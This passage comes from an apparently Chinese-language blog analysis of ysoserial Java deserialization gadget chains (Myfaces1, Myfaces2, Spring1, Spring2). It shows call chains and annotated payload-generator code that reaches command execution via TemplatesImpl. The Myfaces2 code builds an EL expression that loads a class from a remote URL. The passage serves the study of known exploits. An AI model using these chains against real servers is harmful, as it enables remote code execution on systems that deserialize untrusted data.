prefix)</span> </span>&#123;</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="keyword">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                String pName = pds[i].getName();</span><br><span class="line">                Method pReadMethod = pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="keyword">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    Object value = pReadMethod.invoke(<span class="keyword">this</span>._obj, NO_PARAMS);    <span class="comment">// 执行指令，控制 this._obj 为 TemplatesImpl，pReadMethod.name 为 getOutputProperties</span></span><br><span class="line">                    <span class="keyword">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="keyword">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + var8.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h2><blockquote><p>MyFaces 是托管多个与 MVC Web 应用框架 JavaServer Faces(JSF) 技术相关的子项目；MyFaces Core 项目是 JSF 规范的实现<br>结合了反序列化与 EL 表达式执行的相关特点。EL 表达式的主要作用是在Java Web应用程序嵌入到网页中，用以访问页面的上下文以及不同作用域中的对象，取得对象属性的值，或执行简单的运算或判断操作。<br>需要构造 EL 表达式作为 payload</p></blockquote><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ValueExpressionMethodExpression.hashCode()</span><br><span class="line">                ValueExpressionMethodExpression.getMethodExpression()</span><br><span class="line">                    ValueExpressionMethodExpression.getMethodExpression(ELContext)</span><br><span class="line">                        ValueExpressionImpl.getValue()</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.Myfaces1#makeExpressionPayload 利用 MyFaces 构造触发利用的条件， EL 表达式解析和处理还需要由具体的 EL 实现类完成（如 juel 和 apache-el），其中的 ValueExpressionImpl.getValue 具体实现将触发真正的代码执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeExpressionPayload</span> <span class="params">( String expr )</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException, Exception  </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化 FacesContext 及 ELContext</span></span><br><span class="line">    FacesContextImpl fc = <span class="keyword">new</span> FacesContextImpl((ServletContext) <span class="keyword">null</span>, (ServletRequest) <span class="keyword">null</span>, (ServletResponse) <span class="keyword">null</span>);</span><br><span class="line">    ELContext elContext = <span class="keyword">new</span> FacesELContext(<span class="keyword">new</span> CompositeELResolver(), fc);</span><br><span class="line">    <span class="comment">// 使用反射将 elContext 写入 FacesContextImpl 中</span></span><br><span class="line">    Reflections.getField(FacesContextImplBase.class, <span class="string">&quot;_elContext&quot;</span>).set(fc, elContext);</span><br><span class="line">    <span class="comment">// 使用 ExpressionFactory 创建 ValueExpression</span></span><br><span class="line">    ExpressionFactory expressionFactory = ExpressionFactory.newInstance();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 有害</span></span><br><span class="line">    ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);</span><br><span class="line">    ValueExpressionMethodExpression e = <span class="keyword">new</span> ValueExpressionMethodExpression(ve1);</span><br><span class="line">    <span class="comment">// 无害</span></span><br><span class="line">    ValueExpression ve2 = expressionFactory.createValueExpression(elContext, <span class="string">&quot;$&#123;true&#125;&quot;</span>, Object.class);</span><br><span class="line">    ValueExpressionMethodExpression e2 = <span class="keyword">new</span> ValueExpressionMethodExpression(ve2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">    <span class="comment">// 先放入无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段</span></span><br><span class="line">    <span class="comment">// 避免构造过程中触发</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(e2, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发条件的构造只涉及到 ValueExpressionMethodExpression 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MethodExpression me = <span class="keyword">this</span>.getMethodExpression();   <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">return</span> me != <span class="keyword">null</span> ? me.hashCode() : <span class="keyword">this</span>.valueExpression.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> MethodExpression <span class="title">getMethodExpression</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用带参数的方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getMethodExpression(FacesContext.getCurrentInstance().getELContext());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> MethodExpression <span class="title">getMethodExpression</span><span class="params">(ELContext context)</span> </span>&#123;</span><br><span class="line">    Object meOrVe = <span class="keyword">this</span>.valueExpression.getValue(context); <span class="comment">// 这里，由具体实现类完成</span></span><br><span class="line">    <span class="keyword">if</span> (meOrVe <span class="keyword">instanceof</span> MethodExpression) &#123;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(meOrVe <span class="keyword">instanceof</span> ValueExpression)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(meOrVe != <span class="keyword">null</span> &amp;&amp; meOrVe <span class="keyword">instanceof</span> ValueExpression) &#123;</span><br><span class="line">            meOrVe = ((ValueExpression)meOrVe).getValue(context);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h2><blockquote><p>利用链同 Myfaces1<br>在 Myfaces1 的基础上使用 ClassLoader 远程加载恶意类的 EL 表达式执行代码，即提供构造 EL</p></blockquote><p>ysoserial.payloads.Myfaces2#getObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/</span></span><br><span class="line">    String expr = <span class="string">&quot;$&#123;request.setAttribute(&#x27;arr&#x27;,&#x27;&#x27;.getClass().forName(&#x27;java.util.ArrayList&#x27;).newInstance())&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we add fewer than the actual classloaders we end up with a null entry</span></span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ ) &#123;</span><br><span class="line">        expr += <span class="string">&quot;$&#123;request.getAttribute(&#x27;arr&#x27;).add(request.servletContext.getResource(&#x27;/&#x27;).toURI().create(&#x27;&quot;</span> + url + <span class="string">&quot;&#x27;).toURL())&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    expr += <span class="string">&quot;$&#123;request.getClass().getClassLoader().newInstance(request.getAttribute(&#x27;arr&#x27;)&quot;</span></span><br><span class="line">            + <span class="string">&quot;.toArray(request.getClass().getClassLoader().getURLs())).loadClass(&#x27;&quot;</span> + className + <span class="string">&quot;&#x27;).newInstance()&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Myfaces1.makeExpressionPayload(expr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><p>适用版本</p><ul><li>spring-core:4.1.4.RELEASE</li><li>spring-beans:4.1.4.RELEASE</li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.findMethod()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.invokeMethod()</span><br><span class="line">Method.invoke()</span><br><span class="line">Templates(Proxy).newTransformer()</span><br><span class="line">AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">ObjectFactory(Proxy).getObject()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">Method.invoke()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/186GzSMsLyuAnil.png" ><p>ysoserial.payloads.Spring1#getObject 通过 MethodInvokeTypeProvider.readObject 触发方法调用，方法由 ObjectFactoryDelegatingInvocationHandler 代理，最终调用 TemplatesImpl.newTransformer 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap 承载 TemplatesImpl</span></span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，返回 TemplatesImpl</span></span><br><span class="line"><span class="keyword">final</span> ObjectFactory objectFactoryProxy =</span><br><span class="line">Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 objectFactoryProxy 实例化 ObjectFactoryDelegatingInvocationHandler，代理 Type 和 Templates（TemplatesImpl 父类）</span></span><br><span class="line">    <span class="keyword">final</span> Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)</span><br><span class="line">Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)</span><br><span class="line">.newInstance(objectFactoryProxy), Type.class, Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理 TypeProvider 的 getType 方法，返回 typeTemplatesProxy 代理类</span></span><br><span class="line">    <span class="keyword">final</span> Object typeProviderProxy = Gadgets.createMemoitizedProxy(</span><br><span class="line">Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用 typeProviderProxy 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">    <span class="keyword">final</span> Constructor mitpCtor = Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">    <span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line"><span class="comment">// 所以初始化时随便给个 Method，methodName</span></span><br><span class="line"><span class="keyword">final</span> Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> Class[] &#123;&#125;), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射赋值，调用 newTransformer 方法</span></span><br><span class="line">Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Spring 核心包中的 <code>org.springframework.core.SerializableTypeWrapper$TypeProvider</code> 实现了 TypeProvider 接口，是一个可以被反序列化的类。反序列化时调用了 ReflectionUtils，先是 findMethod 返回 Method 对象然后紧接着调用 invokeMethod 进行反射调用（无参调用）。</p><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> 是 InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用。</p><ul><li>使用 AnnotationInvocationHandler 代理，返回任意对象</li><li>使用 ObjectFactoryDelegatingInvocationHandler 代理 TypeProvider$getType 方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MethodInvokeTypeProvider</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodInvokeTypeProvider</span> <span class="keyword">implements</span> <span class="title">SerializableTypeWrapper</span>.<span class="title">TypeProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableTypeWrapper.TypeProvider provider;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String methodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object result;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodInvokeTypeProvider</span><span class="params">(SerializableTypeWrapper.TypeProvider provider, Method method, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.provider = provider;</span><br><span class="line">        <span class="keyword">this</span>.methodName = method.getName();</span><br><span class="line">        <span class="keyword">this</span>.index = index;</span><br><span class="line">        <span class="keyword">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !(<span class="keyword">this</span>.result <span class="keyword">instanceof</span> Type) &amp;&amp; <span class="keyword">this</span>.result != <span class="keyword">null</span> ? ((Type[])((Type[])<span class="keyword">this</span>.result))[<span class="keyword">this</span>.index] : (Type)th</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        Method method = ReflectionUtils.findMethod(<span class="keyword">this</span>.provider.getType().getClass(), <span class="keyword">this</span>.methodName);</span><br><span class="line">        <span class="keyword">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="keyword">this</span>.provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectFactoryDelegatingInvocationHandler</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectFactoryDelegatingInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ObjectFactoryDelegatingInvocationHandler</span><span class="params">(ObjectFactory&lt;?&gt; objectFactory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.objectFactory = objectFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line">        <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.objectFactory.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.objectFactory.getObject(), args);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var6.getTargetException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h2><blockquote><p>使用 spring-aop 的 JdkDynamicAopProxy 替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler</p></blockquote><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.findMethod()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.invokeMethod()</span><br><span class="line">Method.invoke()</span><br><span class="line">Templates(Proxy).newTransformer()</span><br><span class="line">                        JdkDynamicAopProxy.invoke()</span><br><span class="line">                            AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/xtW6eHdnbGPrYyJ.png" ><p>ysoserial.payloads.Spring2#getObject 和 Spring1 的构造方式基本相同，这里用了 AdvisedSupport 实例化 JdkDynamicAopProxy 动态代理，在 MethodInvokeTypeProvider.readObject 中返回 TemplatesImpl 和方法 newTransformer，从而执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化 AdvisedSupport</span></span><br><span class="line">    AdvisedSupport as = <span class="keyword">new</span> AdvisedSupport();</span><br><span class="line">    as.setTargetSource(<span class="keyword">new</span> SingletonTargetSource(templates));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 JdkDynamicAopProxy 动态代理，代理 Type 和 Templates（TemplatesImpl 父类）</span></span><br><span class="line">    <span class="keyword">final</span> Type typeTemplatesProxy = Gadgets.createProxy(</span><br><span class="line">        (InvocationHandler) Reflections.getFirstCtor(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).newInstance(as),</span><br><span class="line">        Type.class,</span><br><span class="line">        Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理 TypeProvider 的 getType 方法，返回 typeTemplatesProxy 代理类</span></span><br><span class="line">    <span class="keyword">final</span> Object typeProviderProxy = Gadgets.createMemoitizedProxy(</span><br><span class="line">        Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">        forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">    Object mitp = Reflections.createWithoutConstructor(forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用反射赋值，使用 typeProviderProxy 代理类 和 newTransformer 方法</span></span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;provider&quot;</span>, typeProviderProxy);</span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 AopUtils#invokeJoinpointUsingReflection() 方法反射调用对象的 method 方法并返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 